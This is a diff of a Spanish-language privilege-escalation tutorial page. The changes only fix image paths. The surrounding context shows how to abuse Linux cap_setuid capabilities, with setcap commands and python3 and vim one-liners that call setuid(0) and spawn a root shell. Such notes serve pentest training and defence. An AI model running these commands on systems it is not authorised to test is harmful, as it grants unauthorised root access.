@@ -578,7 +578,7 @@ ps -faux
 ps -eo user,command
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled.png)
 
 Se puede decodear esa cadena en hexadecimal con el siguiente comando:
 
@@ -606,7 +606,7 @@ getpcaps <PID>
 capsh --print
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled 1.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 1.png)
 
 ## Explotación de Capabilities
 
@@ -620,7 +620,7 @@ Nota: Se debe asignar el permiso al archivo original y no a un enlace simbólico
 setcap cap_setuid+ep /usr/bin/python3.10
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled 2.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 2.png)
 
 El atacante se puede aprovechar de esta vulnerabilidad para cambiar el UID del usuario actual por el del usuario root:
 
@@ -628,7 +628,7 @@ El atacante se puede aprovechar de esta vulnerabilidad para cambiar el UID del u
 python3 -c 'import os; os.setuid(0); os.system("bash")'
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled 3.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 3.png)
 
 ### cap_setuid=ep - vim
 
@@ -640,7 +640,7 @@ Nota: Se debe asignar el permiso al archivo original y no al enlace simbólico.
 setcap cap_setuid+ep /usr/bin/vim.basic
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled 4.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 4.png)
 
 El atacante ahora se puede aprovechar de este permiso para elevar su privilegio:
 
@@ -654,7 +654,7 @@ $(which vim) -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "
 $(which vim) -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
 ```
 
-![Untitled](/assets/Privesc/Exploiting-Capabilities/20cc9d0e7a1d7347b0b24da07ebfadde74/Untitled 5.png)
+![Untitled](/assets/Privesc/Exploiting-Capabilities/Untitled 5.png)
 
 
 # Detección y explotación de tareas Cron
